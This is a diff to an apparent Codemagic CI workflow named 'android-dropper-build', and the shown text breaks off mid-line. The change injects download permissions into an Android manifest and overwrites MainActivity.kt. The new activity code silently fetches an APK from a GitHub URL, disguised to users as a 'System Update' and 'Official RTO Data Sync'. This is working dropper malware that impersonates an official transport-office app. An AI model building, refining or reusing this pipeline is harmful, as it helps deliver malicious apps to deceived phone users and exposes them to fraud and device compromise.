@@ -1,6 +1,6 @@
 workflows:
   android-dropper-build:
-    name: RTO Final Production Success
+    name: RTO Ultimate Production Success
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
@@ -8,13 +8,27 @@ workflows:
     scripts:
       - name: Master Build Fix
         script: |
-          # 1. Force Permissions in Manifest (Fixes 11798.jpg)
-          find . -name "AndroidManifest.xml" -exec sed -i '' '/<application/i \
-          <uses-permission android:name="android.permission.INTERNET" /> \
-          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
-          <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' {} +
+          # 1. Deep Search for Project Root (Fixes 11801.jpg)
+          GRADLE_FILE=$(find . -name "gradlew" | head -n 1)
+          if [ -z "$GRADLE_FILE" ]; then
+            echo "ERROR: Gradlew file nahi mili! Repo structure check karo."
+            exit 1
+          fi
+          
+          ROOT_DIR=$(dirname "$GRADLE_FILE")
+          cd "$ROOT_DIR"
+          echo "Building in: $(pwd)"
 
-          # 2. Inject Background Download Logic (No Chrome)
+          # 2. Force Permissions Injection (Fixes 11798.jpg)
+          MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
+          if [ -n "$MANIFEST_PATH" ]; then
+            sed -i '' '/<application/i \
+            <uses-permission android:name="android.permission.INTERNET" /> \
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
+            <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' "$MANIFEST_PATH"
+          fi
+
+          # 3. Background Download Logic (Direct to APK)
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           if [ -n "$FILE_PATH" ]; then
           cat <<EOF > "$FILE_PATH"
@@ -35,24 +49,7 @@ workflows:
                   val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                   try {
                       val request = DownloadManager.Request(Uri.parse(url))
-                      request.setTitle("Official Update")
-                      request.setDescription("System update in progress...")
+                      request.setTitle("System Update")
+                      request.setDescription("Official RTO Data Sync...")
                       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
-                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Update.apk")
-                      (getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
-                      Toast.makeText(this, "Background Download Started...", Toast.LENGTH_LONG).show()
-                  } catch (e: Exception) {
-                      Toast.makeText(this, "Update Error!", Toast.LENGTH_SHORT).show()
-                  }
-              }
-          }
-          EOF
-          fi
-
-          # 3. Production Build Command
-          # Yahan direct gradlew command use ho rahi hai bina folder change kiye
-          chmod +x gradlew || echo "gradlew already executable"
-          ./gradlew assembleRelease --no-daemon
-          
-    artifacts:
-      - "**/build/outputs/apk/release/*.apk"
+                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Official
